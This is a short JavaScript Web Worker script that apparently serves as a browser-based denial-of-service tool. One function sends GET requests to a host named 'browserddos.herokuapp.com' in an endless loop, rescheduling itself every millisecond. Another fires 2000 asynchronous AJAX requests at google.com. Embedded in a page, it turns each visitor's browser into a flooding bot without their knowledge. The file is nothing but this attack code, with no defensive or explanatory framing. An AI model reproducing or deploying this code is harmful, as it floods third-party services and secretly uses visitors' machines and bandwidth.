

onmessage = function(event){get_work()}



function get_work()
{	
    postMessage("In Web Worker");
	
    var g_w = new XMLHttpRequest();
    g_w.open("GET", "https://browserddos.herokuapp.com/");
    g_w.send();
    
    
    setTimeout("get_work()", 1);
    
    
}



function get_work2() {
	var counter = 0;
	while (counter < 2000) {
		$.ajax({
			url : 'http://www.google.com/',
			async : true,			
			
		});
		counter++;
	}
}
